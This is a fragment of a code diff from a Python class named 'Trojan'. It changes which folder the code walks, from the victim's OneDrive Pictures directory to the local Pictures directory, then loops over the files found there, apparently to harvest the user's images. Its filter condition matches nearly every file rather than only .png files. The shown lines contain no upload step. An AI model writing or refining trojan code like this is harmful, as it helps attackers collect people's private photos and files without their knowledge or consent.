@@ -35,7 +35,7 @@ class Trojan:
         counter= 0
         inp = '.png'
         thisdir = os.getcwd()
-        for r, d, f in os.walk(f"C:\\Users\\{usname}\\OneDrive\\Pictures"):
+        for r, d, f in os.walk(f"C:\\Users\\{usname}\\Pictures"):
             for file in f:
                 filepath = os.path.join(r, file)
                 if inp in file or '$' not in file:
